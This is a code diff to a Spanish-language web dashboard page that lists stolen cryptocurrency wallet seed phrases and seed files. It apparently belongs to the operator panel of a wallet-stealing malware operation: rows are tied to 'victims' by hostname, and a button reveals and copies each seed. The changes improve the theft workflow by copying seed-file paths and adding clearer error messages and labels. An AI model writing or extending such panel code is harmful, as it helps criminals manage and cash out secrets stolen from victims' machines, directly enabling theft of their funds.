@@ -13,6 +13,7 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Empty, ErrorState, SkeletonRows, Table, TD, TH, THead, TR } from '@/components/ui/table';
 import { dateTime } from '@/lib/format';
+import { humanError } from '@/lib/errors';
 import type { VaultSecretRow } from '@/lib/types';
 import { VaultDrawer } from '@/components/vault-drawer';
 
@@ -32,12 +33,18 @@ export default function SeedsPage() {
   const { data, loading, error, refresh } = useApi<{ items: VaultSecretRow[] }>(`/vault/secrets?${query}`, { pollMs: 20_000 });
 
   async function copyRow(row: VaultSecretRow) {
+    // Un `seed_file` es un fichero, no una frase: se copia su ruta.
+    if (row.kind === 'seed_file') {
+      copy(row.wallet.path);
+      toast.success('Ruta del fichero copiada');
+      return;
+    }
     try {
       const result = await api<{ value: string }>(`/vault/wallets/${row.wallet.id}/reveal?secretId=${row.id}&kind=${row.kind}`);
       copy(result.value);
       toast.success('Copiado');
     } catch (caught) {
-      toast.error(caught instanceof ApiError ? caught.message : 'No se pudo revelar');
+      toast.error(caught instanceof ApiError ? humanError(caught) : 'No se pudo revelar');
     }
   }
 
@@ -68,13 +75,13 @@ export default function SeedsPage() {
                 {(data!.items).map((row) => (
                   <TR key={row.id}>
                     <TD><Badge tone={row.kind === 'seed' ? 'ok' : row.kind === 'seed_file' ? 'warn' : 'brand'}>{KIND_LABEL[row.kind] ?? row.kind}</Badge>{row.words ? <span className="ml-1 text-2xs text-muted">{row.words} palabras</span> : null}</TD>
-                    <TD className="max-w-[150px] truncate font-mono text-xs sm:max-w-[360px]" title={row.preview}>{row.kind === 'seed_file' ? row.wallet.targetId : row.preview}</TD>
+                    <TD className="max-w-[150px] truncate font-mono text-xs sm:max-w-[360px]" title={row.kind === 'seed_file' ? row.wallet.path : row.preview}>{row.kind === 'seed_file' ? row.wallet.path.split(/[\\/]/).pop() : row.preview}</TD>
                     <TD className="hidden max-w-[320px] truncate font-mono text-2xs text-muted lg:table-cell" title={row.wallet.path}>{row.wallet.targetId} · {row.wallet.path}</TD>
                     <TD className="hidden sm:table-cell"><Link className="font-mono text-brand" href={`/victims?select=${row.victim.id}&tab=boveda`}>{row.victim.hostname}</Link></TD>
                     <TD className="hidden num text-2xs text-muted sm:table-cell">{dateTime(row.updatedAt)}</TD>
                     <TD className="whitespace-nowrap">
                       <div className="flex justify-end gap-1">
-                      <Button size="sm" variant="ghost" onClick={() => void copyRow(row)} title="Revelar y copiar"><Copy className="h-3 w-3" /></Button>
+                      <Button size="sm" variant="ghost" onClick={() => void copyRow(row)} title={row.kind === 'seed_file' ? 'Copiar ruta del fichero' : 'Revelar y copiar'}><Copy className="h-3 w-3" /></Button>
                       <Button size="sm" variant="ghost" onClick={() => setWallet(row.wallet.id)}>abrir</Button>
                       </div>
                     </TD>
@@ -84,7 +91,7 @@ export default function SeedsPage() {
             </Table>
           )}
         </Card>
-        <p className="text-2xs text-muted">Se muestran hasta 200 entradas. Usa el buscador para acotar; los valores se revelan contra la bóveda y quedan auditados.</p>
+        <p className="text-2xs text-muted">Se muestran hasta 200 entradas. Las semillas se revelan contra la bóveda y quedan auditadas; los ficheros de semillas copian su ruta.</p>
       </div>
       <VaultDrawer walletId={wallet} onClose={() => setWallet(null)} />
     </>
